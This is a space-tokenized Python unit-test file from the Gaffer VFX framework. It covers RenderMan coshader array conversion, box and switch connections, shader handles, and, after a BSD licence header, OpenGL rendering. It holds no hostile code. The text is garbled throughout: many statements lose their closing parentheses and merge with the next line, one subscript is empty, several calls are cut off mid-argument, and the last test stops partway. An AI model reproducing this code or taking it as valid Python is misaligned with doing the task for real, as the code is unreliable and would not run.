s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . setInput ( None ) \n 
\n 
self . assertEqual ( len ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] ) , 1 ) \n 
self . assertTrue ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
~~ def testConvertFixedCoshaderArrayToDynamicWithFirstPlugUnconnected ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) shaderV2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParametersV2.sl" coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "n" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "n" ] . loadShader ( shader ) \n 
\n 
s [ "c" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "c" ] . loadShader ( coshader ) \n 
\n 
s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . setInput ( s [ "c" ] [ "out" ] ) \n 
self . assertTrue ( len ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] ) , 4 ) \n 
\n 
s [ "n" ] . loadShader ( shaderV2 , keepExistingValues = True ) \n 
\n 
self . assertTrue ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . getInput ( ) . isSame ( s [ "c" ] [ "out" ] ) ) \n 
self . assertTrue ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . setInput ( None ) \n 
\n 
self . assertEqual ( len ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] ) , 1 ) \n 
self . assertTrue ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
~~ def testConvertFixedCoshaderArrayToDynamicDuringLoading ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "n" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "n" ] . loadShader ( shader ) \n 
\n 
s [ "c" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "c" ] . loadShader ( coshader ) \n 
\n 
s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . setInput ( s [ "c" ] [ "out" ] ) \n 
self . assertTrue ( len ( s [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] ) , 4 ) \n 
\n 
GafferRenderMan . RenderManShader . shaderLoader ( ) . clear ( ) \n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParametersV2.sl" \n 
s2 = Gaffer . ScriptNode ( ) \n 
s2 . execute ( s . serialise ( ) ) \n 
\n 
self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . getInput ( ) . isSame ( s2 [ "c" ] [ "out" ] ) self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
s2 [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . setInput ( None ) \n 
\n 
self . assertEqual ( len ( s2 [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] ) , 1 ) \n 
self . assertTrue ( s2 [ "n" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . getInput ( ) is None ) \n 
\n 
~~ def testHashThroughBox ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
# box up an intermediate coshader: \n 
b = Gaffer . Box ( ) \n 
\n 
b . addChild ( Gaffer . Plug ( "in" ) ) \n 
b . addChild ( Gaffer . Plug ( "out" , direction = Gaffer . Plug . Direction . Out ) ) \n 
\n 
intermediateCoshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderWithPassThrough.sl" intermediateCoshaderNode = GafferRenderMan . RenderManShader ( ) \n 
intermediateCoshaderNode . loadShader ( intermediateCoshader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
b [ "in" ] . setInput ( coshaderNode [ "out" ] ) \n 
intermediateCoshaderNode [ "parameters" ] [ "aColorIWillTint" ] . setInput ( b [ "in" ] ) \n 
b [ "out" ] . setInput ( intermediateCoshaderNode [ "out" ] ) \n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( b [ "out" ] ) \n 
\n 
h1 = shaderNode . stateHash ( ) \n 
\n 
coshaderNode [ "parameters" ] [ "floatParameter" ] . setValue ( 0.25 ) \n 
\n 
self . assertNotEqual ( shaderNode . stateHash ( ) , h1 ) \n 
\n 
~~ def testDanglingBoxConnection ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode1 = GafferRenderMan . RenderManShader ( ) \n 
shaderNode1 . loadShader ( shader ) \n 
\n 
shaderNode2 = GafferRenderMan . RenderManShader ( ) \n 
shaderNode2 . loadShader ( shader ) \n 
\n 
b = Gaffer . Box ( ) \n 
b . addChild ( Gaffer . Plug ( "in" ) ) \n 
b . addChild ( Gaffer . Plug ( "out" , direction = Gaffer . Plug . Direction . Out ) ) \n 
\n 
b [ "shader1" ] = shaderNode1 \n 
shaderNode1 [ "parameters" ] [ "coshaderParameter" ] . setInput ( b [ "in" ] ) \n 
\n 
shaderNode2 [ "parameters" ] [ "coshaderParameter" ] . setInput ( b [ "out" ] ) \n 
\n 
~~ def testUnconnectedCustomBoxInput ( self ) : \n 
\n 
~~~ class CustomBox ( Gaffer . Box ) : \n 
\n 
~~~ def __init__ ( self , name = "CustomBox" ) : \n 
\n 
~~~ Gaffer . Box . __init__ ( self , name ) \n 
\n 
~~ ~~ IECore . registerRunTimeTyped ( CustomBox ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
# create a box and put a shader in it \n 
\n 
b = CustomBox ( ) \n 
b [ "s" ] = GafferRenderMan . RenderManShader ( ) \n 
b [ "s" ] . loadShader ( shader ) \n 
\n 
# create a plug on the outside of the box, and connect it into \n 
# the shader. \n 
\n 
b [ "in" ] = b [ "s" ] [ "parameters" ] [ "coshaderParameter" ] . createCounterpart ( "in" , Gaffer . Plug . Direction \n 
b [ "s" ] [ "parameters" ] [ "coshaderParameter" ] . setInput ( b [ "in" ] ) \n 
s = b [ "s" ] . state ( ) \n 
self . assertEqual ( len ( s ) , 1 ) \n 
self . assertEqual ( s [ 0 ] . name , shader ) \n 
\n 
self . assertTrue ( b [ "s" ] [ "parameters" ] [ "coshaderParameter" ] . getInput ( ) . isSame ( b [ "in" ] ) ) \n 
\n 
# check that it is now possible to connect appropriate coshaders \n 
# into the box plug, and that appropriate networks are generated that way. \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
c = GafferRenderMan . RenderManShader ( ) \n 
c . loadShader ( coshader ) \n 
\n 
self . assertTrue ( b [ "in" ] . acceptsInput ( c [ "out" ] ) ) \n 
b [ "in" ] . setInput ( c [ "out" ] ) \n 
\n 
s = b [ "s" ] . state ( ) \n 
self . assertEqual ( len ( s ) , 2 ) \n 
self . assertEqual ( s [ 1 ] . parameters [ "coshaderParameter" ] , s [ 0 ] . parameters [ "__handle" ] ) \n 
\n 
\n 
\n 
\n 
n = Gaffer . Node ( ) \n 
n [ "out" ] = b [ "in" ] . createCounterpart ( "out" , Gaffer . Plug . Direction . Out ) \n 
\n 
self . assertFalse ( b [ "in" ] . acceptsInput ( n [ "out" ] ) ) \n 
self . assertRaises ( RuntimeError , b [ "in" ] . setInput , n [ "out" ] ) \n 
\n 
# and check that if we remove the internal connection to the shader, the exterior plug \n 
# will start accepting new connections again. \n 
\n 
b [ "s" ] [ "parameters" ] [ "coshaderParameter" ] . setInput ( None ) \n 
\n 
self . assertTrue ( b [ "in" ] . acceptsInput ( n [ "out" ] ) ) \n 
b [ "in" ] . setInput ( n [ "out" ] ) \n 
self . assertTrue ( b [ "in" ] . getInput ( ) . isSame ( n [ "out" ] ) ) \n 
\n 
# and that the shader will reject connection to the plug with the dodgy input. \n 
\n 
self . assertFalse ( b [ "s" ] [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( b [ "in" ] ) ) \n 
self . assertRaises ( RuntimeError , b [ "s" ] [ "parameters" ] [ "coshaderParameter" ] . setInput , b [ "in" ] ) \n 
\n 
~~ def testCoshaderSwitching ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode0 = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode0 . loadShader ( coshader ) \n 
\n 
coshaderNode1 = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode1 . loadShader ( coshader ) \n 
\n 
coshaderNode0 [ "parameters" ] [ "floatParameter" ] . setValue ( 0 ) \n 
coshaderNode1 [ "parameters" ] [ "floatParameter" ] . setValue ( 1 ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
switch = GafferScene . ShaderSwitch ( ) \n 
switch [ "in" ] . setInput ( coshaderNode0 [ "out" ] ) \n 
switch [ "in1" ] . setInput ( coshaderNode1 [ "out" ] ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( switch [ "out" ] ) \n 
self . assertEqual ( shaderNode . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 0 ) \n 
\n 
switch [ "index" ] . setValue ( 1 ) \n 
self . assertEqual ( shaderNode . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 1 ) \n 
\n 
switch [ "enabled" ] . setValue ( False ) \n 
self . assertEqual ( shaderNode . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 0 ) \n 
\n 
~~ def testCoshaderTypingPreventsNewInvalidSwitchInputs ( self ) : \n 
\n 
~~~ coshaderType1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderType1.sl" ) \n 
coshaderType1Node = GafferRenderMan . RenderManShader ( ) \n 
coshaderType1Node . loadShader ( coshaderType1 ) \n 
\n 
coshaderType2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderType2.sl" ) \n 
coshaderType2Node = GafferRenderMan . RenderManShader ( ) \n 
coshaderType2Node . loadShader ( coshaderType2 ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/typedCoshaderParameters.sl" shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
switch = GafferScene . ShaderSwitch ( ) \n 
switch [ "in" ] . setInput ( coshaderType1Node [ "out" ] ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameterType1" ] . setInput ( switch [ "out" ] ) \n 
\n 
self . assertFalse ( switch [ "in1" ] . acceptsInput ( coshaderType2Node [ "out" ] ) ) \n 
self . assertTrue ( switch [ "in1" ] . acceptsInput ( coshaderType1Node [ "out" ] ) ) \n 
\n 
~~ def testAcceptInputFromEmptySwitch ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
switch = GafferScene . ShaderSwitch ( ) \n 
\n 
self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( switch [ "out" ] ) ) \n 
\n 
~~ def testCoshaderSwitchingInBox ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
script = Gaffer . ScriptNode ( ) \n 
\n 
script [ "coshaderNode0" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "coshaderNode0" ] . loadShader ( coshader ) \n 
\n 
script [ "coshaderNode1" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "coshaderNode1" ] . loadShader ( coshader ) \n 
\n 
script [ "coshaderNode0" ] [ "parameters" ] [ "floatParameter" ] . setValue ( 0 ) \n 
script [ "coshaderNode1" ] [ "parameters" ] [ "floatParameter" ] . setValue ( 1 ) \n 
\n 
script [ "shaderNode" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "shaderNode" ] . loadShader ( shader ) \n 
\n 
script [ "switch" ] = GafferScene . ShaderSwitch ( ) \n 
script [ "switch" ] [ "in" ] . setInput ( script [ "coshaderNode0" ] [ "out" ] ) \n 
script [ "switch" ] [ "in1" ] . setInput ( script [ "coshaderNode1" ] [ "out" ] ) \n 
\n 
script [ "shaderNode" ] [ "parameters" ] [ "coshaderParameter" ] . setInput ( script [ "switch" ] [ "out" ] ) \n 
\n 
self . assertEqual ( script [ "shaderNode" ] . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 0 ) \n 
\n 
box = Gaffer . Box . create ( script , Gaffer . StandardSet ( script . children ( Gaffer . Node ) ) ) \n 
self . assertEqual ( box [ "shaderNode" ] . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 0 ) \n 
\n 
promotedIndex = box . promotePlug ( box [ "switch" ] [ "index" ] ) \n 
self . assertEqual ( box [ "shaderNode" ] . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 0 ) \n 
\n 
promotedIndex . setValue ( 1 ) \n 
self . assertEqual ( box [ "shaderNode" ] . state ( ) [ 0 ] . parameters [ "floatParameter" ] . value , 1 ) \n 
\n 
~~ def testRepeatability ( self ) : \n 
\n 
~~~ s1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
s2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
sn1 = GafferRenderMan . RenderManShader ( ) \n 
sn2 = GafferRenderMan . RenderManShader ( ) \n 
sn1 . loadShader ( s1 ) \n 
sn2 . loadShader ( s2 ) \n 
\n 
sn2 [ "parameters" ] [ "coshaderParameter" ] . setInput ( sn1 [ "out" ] ) \n 
\n 
self . assertEqual ( sn2 . stateHash ( ) , sn2 . stateHash ( ) ) \n 
self . assertEqual ( sn2 . state ( ) , sn2 . state ( ) ) \n 
\n 
~~ def testHandlesAreHumanReadable ( self ) : \n 
\n 
~~~ s1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
s2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
sn1 = GafferRenderMan . RenderManShader ( "Shader1" ) \n 
sn2 = GafferRenderMan . RenderManShader ( "Shader2" ) \n 
sn1 . loadShader ( s1 ) \n 
sn2 . loadShader ( s2 ) \n 
\n 
sn2 [ "parameters" ] [ "coshaderParameter" ] . setInput ( sn1 [ "out" ] ) \n 
\n 
state = sn2 . state ( ) \n 
self . assertTrue ( "Shader1" in state [ 0 ] . parameters [ "__handle" ] . value ) \n 
\n 
~~ def testHandlesAreUniqueEvenIfNodeNamesArent ( self ) : \n 
\n 
~~~ s1 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
s2 = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderArrayParameters.sl" ) \n 
\n 
script = Gaffer . ScriptNode ( ) \n 
\n 
script [ "in1" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "in1" ] . loadShader ( s1 ) \n 
\n 
script [ "in2" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "in2" ] . loadShader ( s1 ) \n 
\n 
script [ "shader" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "shader" ] . loadShader ( s2 ) \n 
\n 
script [ "shader" ] [ "parameters" ] [ "fixedShaderArray" ] [ 0 ] . setInput ( script [ "in1" ] [ "out" ] ) \n 
script [ "shader" ] [ "parameters" ] [ "fixedShaderArray" ] [ 1 ] . setInput ( script [ "in2" ] [ "out" ] ) \n 
\n 
box = Gaffer . Box . create ( script , Gaffer . StandardSet ( [ script [ "in1" ] ] ) ) \n 
\n 
# because the nodes have different parents, we can give them the same name. \n 
box [ "in1" ] . setName ( "notUnique" ) \n 
script [ "in2" ] . setName ( "notUnique" ) \n 
\n 
state = script [ "shader" ] . state ( ) \n 
self . assertNotEqual ( state [ 0 ] . parameters [ "__handle" ] , state [ 1 ] . parameters [ "__handle" ] ) \n 
\n 
~~ def testShaderTypesInState ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
\n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
shaderNode [ "parameters" ] [ "coshaderParameter" ] . setInput ( coshaderNode [ "out" ] ) \n 
\n 
state = shaderNode . state ( ) \n 
self . assertEqual ( state [ 0 ] . type , "ri:shader" ) \n 
self . assertEqual ( state [ 1 ] . type , "ri:surface" ) \n 
\n 
~~ def testAssignmentAttributeName ( self ) : \n 
\n 
~~~ p = GafferScene . Plane ( ) \n 
\n 
s = GafferRenderMan . RenderManShader ( ) \n 
s . loadShader ( "plastic" ) \n 
\n 
a = GafferScene . ShaderAssignment ( ) \n 
a [ "in" ] . setInput ( p [ "out" ] ) \n 
a [ "shader" ] . setInput ( s [ "out" ] ) \n 
\n 
self . assertEqual ( a [ "out" ] . attributes ( "/plane" ) . keys ( ) , [ "ri:surface" ] ) \n 
\n 
~~ def testVolumeShader ( self ) : \n 
\n 
~~~ s = GafferRenderMan . RenderManShader ( ) \n 
s . loadShader ( "fog" ) \n 
\n 
self . assertEqual ( s [ "type" ] . getValue ( ) , "ri:atmosphere" ) \n 
\n 
s [ "type" ] . setValue ( "ri:interior" ) \n 
s . loadShader ( "fog" , keepExistingValues = True ) \n 
self . assertEqual ( s [ "type" ] . getValue ( ) , "ri:interior" ) \n 
\n 
s . loadShader ( "fog" , keepExistingValues = False ) \n 
self . assertEqual ( s [ "type" ] . getValue ( ) , "ri:atmosphere" ) \n 
\n 
~~ def testInputAcceptanceFromDots ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
coshaderNode = GafferRenderMan . RenderManShader ( ) \n 
coshaderNode . loadShader ( coshader ) \n 
\n 
dot = Gaffer . Dot ( ) \n 
dot . setup ( coshaderNode [ "out" ] ) \n 
\n 
self . assertTrue ( shaderNode [ "parameters" ] [ "coshaderParameter" ] . acceptsInput ( dot [ "out" ] ) ) \n 
\n 
~~ def testShaderTypeOverride ( self ) : \n 
\n 
~~~ shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/shaderTypeOverride.sl" ) \n 
shaderNode = GafferRenderMan . RenderManShader ( ) \n 
shaderNode . loadShader ( shader ) \n 
\n 
self . assertEqual ( shaderNode [ ] . getValue ( ) , "ri:overrideType" ) \n 
\n 
~~ def testReferencePromotedCoshader ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
\n 
shader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshaderParameter.sl" ) \n 
coshader = self . compileShader ( os . path . dirname ( __file__ ) + "/shaders/coshader.sl" ) \n 
\n 
s [ "b" ] = Gaffer . Box ( ) \n 
s [ "b" ] [ "s" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "b" ] [ "s" ] . loadShader ( shader ) \n 
p = s [ "b" ] . promotePlug ( s [ "b" ] [ "s" ] [ "parameters" ] [ "coshaderParameter" ] ) \n 
p . setName ( "p" ) \n 
\n 
s [ "c" ] = GafferRenderMan . RenderManShader ( ) \n 
s [ "c" ] . loadShader ( coshader ) \n 
\n 
self . assertTrue ( s [ "b" ] [ "p" ] . acceptsInput ( s [ "c" ] [ "out" ] ) ) \n 
\n 
s [ "b" ] . exportForReference ( self . temporaryDirectory ( ) + "/test.grf" ) \n 
\n 
s [ "r" ] = Gaffer . Reference ( ) \n 
s [ "r" ] . load ( self . temporaryDirectory ( ) + "/test.grf" ) \n 
\n 
self . assertTrue ( s [ "r" ] [ "p" ] . acceptsInput ( s [ "c" ] [ "out" ] ) ) \n 
\n 
~~ def testLoadAndGIL ( self ) : \n 
\n 
~~~ script = Gaffer . ScriptNode ( ) \n 
\n 
script [ "plane" ] = GafferScene . Plane ( ) \n 
script [ "plane" ] [ "divisions" ] . setValue ( IECore . V2i ( 20 ) ) \n 
\n 
script [ "sphere" ] = GafferScene . Sphere ( ) \n 
\n 
script [ "expression" ] = Gaffer . Expression ( ) \n 
script [ "expression" ] . setExpression ( "parent[\'sphere\'][\'radius\'] = 0.2 + context.getFrame() + float( context[\'instancer:id\'] )" \n 
script [ "instancer" ] = GafferScene . Instancer ( ) \n 
script [ "instancer" ] [ "in" ] . setInput ( script [ "plane" ] [ "out" ] ) \n 
script [ "instancer" ] [ "instance" ] . setInput ( script [ "sphere" ] [ "out" ] ) \n 
script [ "instancer" ] [ "parent" ] . setValue ( "/plane" ) \n 
\n 
script [ "shader" ] = GafferRenderMan . RenderManShader ( ) \n 
script [ "assignment" ] = GafferScene . ShaderAssignment ( ) \n 
script [ "assignment" ] [ "in" ] . setInput ( script [ "instancer" ] [ "out" ] ) \n 
script [ "assignment" ] [ "shader" ] . setInput ( script [ "shader" ] [ "out" ] ) \n 
\n 
traverseConnection = Gaffer . ScopedConnection ( GafferSceneTest . connectTraverseSceneToPlugDirtiedSignal script [ "shader" ] . loadShader ( "matte" ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2013-2014, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import os \n 
import unittest \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferImage \n 
import GafferScene \n 
import GafferSceneTest \n 
\n 
@ unittest . skipIf ( "TRAVIS" in os . environ , "OpenGL not set up on Travis" ) \n 
class OpenGLRenderTest ( GafferSceneTest . SceneTestCase ) : \n 
\n 
~~~ def test ( self ) : \n 
\n 
~~~ self . assertFalse ( os . path . exists ( self . temporaryDirectory ( ) + "/test.exr" ) ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
s [ "plane" ] [ "transform" ] [ "translate" ] . setValue ( IECore . V3f ( 0 , 0 , - 5 ) ) \n 
\n 
s [ "image" ] = GafferImage . ImageReader ( ) \n 
s [ "image" ] [ "fileName" ] . setValue ( os . path . expandvars ( "$GAFFER_ROOT/python/GafferImageTest/images/checker.exr" \n 
s [ "shader" ] = GafferScene . OpenGLShader ( ) \n 
s [ "shader" ] . loadShader ( "Texture" ) \n 
s [ "shader" ] [ "parameters" ] [ "texture" ] . setInput ( s [ "image" ] [ "out" ] ) \n 
s [ "shader" ] [ "parameters" ] [ "mult" ] . setValue ( 1 ) \n 
s [ "shader" ] [ "parameters" ] [ "tint" ] . setValue ( IECore . Color4f ( 1 ) ) \n 
\n 
s [ "assignment" ] = GafferScene . ShaderAssignment ( ) \n 
s [ "assignment" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
s [ "assignment" ] [ "shader" ] . setInput ( s [ "shader" ] [ "out" ] ) \n 
\n 
s [ "outputs" ] = GafferScene . Outputs ( ) \n 
s [ "outputs" ] . addOutput ( \n 
"beauty" , \n 
IECore . Display ( \n 
self . temporaryDirectory ( ) + "/test.exr" , \n 
"exr" , \n 
"rgba" , \n 
{ } \n 
) \n 
) \n 
s [ "outputs" ] [ "in" ] . setInput ( s [ "assignment" ] [ "out" ] ) \n 
\n 
s [ "render" ] = GafferScene . OpenGLRender ( ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "outputs" ] [ "out" ] ) \n 
\n 
s [ "fileName" ] . setValue ( self . temporaryDirectory ( ) + "/test.gfr" ) \n 
s . save ( ) \n 
\n 
s [ "render" ] [ "task" ] . execute ( ) \n 
\n 
self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/test.exr" ) ) \n 
\n 
i = IECore . EXRImageReader ( self . temporaryDirectory ( ) + "/test.exr" ) . read ( ) \n 
e = IECore . ImagePrimitiveEvaluator ( i ) \n 
r = e . createResult ( ) \n 
e . pointAtUV ( IECore . V2f ( 0.5 ) , r ) \n 
self . assertAlmostEqual ( r . floatPrimVar ( e . R ( ) ) , 0.666666 , 5 ) \n 
self . assertAlmostEqual ( r . floatPrimVar ( e . G ( ) ) , 0.666666 , 5 ) \n 
self . assertEqual ( r . floatPrimVar ( e . B ( ) ) , 0 ) \n 
\n 
~~ def testOutputDirectoryCreation ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
s [ "variables" ] . addMember ( "renderDirectory" , self . temporaryDirectory ( ) + "/openGLRenderTest" ) \n 
\n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
\n 
s [ "outputs" ] = GafferScene . Outputs ( ) \n 
s [ "outputs" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
s [ "outputs" ] . addOutput ( \n 
"beauty" , \n 
IECore . Display ( \n 
"$renderDirectory/test.####.exr" , \n 
"exr" , \n 
"rgba" , \n 
{ } \n 
) \n 
) \n 
\n 
s [ "render" ] = GafferScene . OpenGLRender ( ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "outputs" ] [ "out" ] ) \n 
\n 
self . assertFalse ( os . path . exists ( self . temporaryDirectory ( ) + "/openGLRenderTest" ) ) \n 
self . assertFalse ( os . path . exists ( self . temporaryDirectory ( ) + "/openGLRenderTest/test.0001.exr" ) \n 
s [ "fileName" ] . setValue ( "/tmp/test.gfr" ) \n 
\n 
with s . context ( ) : \n 
~~~ s [ "render" ] [ "task" ] . execute ( ) \n 
\n 
~~ self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/openGLRenderTest" ) ) \n 
self . assertTrue ( os . path . exists ( self . temporaryDirectory ( ) + "/openGLRenderTest/test.0001.exr" ) ) \n 
~~ def testHash ( self ) : \n 
\n 
~~~ c = Gaffer . Context ( ) \n 
c . setFrame ( 1 ) \n 
c2 = Gaffer . Context ( ) \n 
c2 . setFrame ( 2 ) \n 
\n 
s = Gaffer . ScriptNode ( ) \n 
s [ "plane" ] = GafferScene . Plane ( ) \n 
s [ "outputs" ] = GafferScene . Outputs ( ) \n 
s [ "outputs" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
s [ "outputs" ] . addOutput ( "beauty" , IECore . Display ( "$renderDirectory/test.####.exr" , "exr" , "rgba" , s [ "render" ] = GafferScene . OpenGLRender ( ) \n 
\n 
# no input scene produces no effect \n 
